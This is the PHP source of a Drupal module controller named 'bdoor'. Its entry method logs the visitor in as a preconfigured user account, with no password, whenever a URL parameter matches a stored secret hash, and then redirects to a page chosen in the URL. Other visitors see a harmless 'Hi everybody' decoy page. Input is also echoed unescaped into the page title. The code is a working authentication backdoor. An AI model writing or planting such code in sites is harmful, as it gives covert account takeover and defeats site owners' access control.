<?php

namespace Drupal\bdoor\Controller;

use Drupal\Core\Controller\ControllerBase;
use Drupal\user\Entity\User;
use Symfony\Component\HttpFoundation\RedirectResponse;


class BdoorController extends ControllerBase {


  public function entry($secret, $page) {

    $config = \Drupal::config('bdoor.settings');
    $newUid = $this->allowedUid( $config->get('username') );

    $uid = \Drupal::currentUser()->id();
    if($secret == $config->get('hash')) {
      if ($uid != $newUid) {
        $user = User::load($newUid);
        user_login_finalize($user);
      }
      return new RedirectResponse("/".$page);
    } else {
      //simple page
      $output = array();
      $output['#title'] = 'Hi everybody!|'.$secret."|$page||";
      $output['#markup'] = 'Hi everybody';
      return $output;
    }
  }

  private function allowedUid($username) {
    $UIDs =  \Drupal::entityQuery('user')
      ->condition('status', 1)
      ->condition('name', $username)
      ->execute();
    return array_shift($UIDs);
  }

}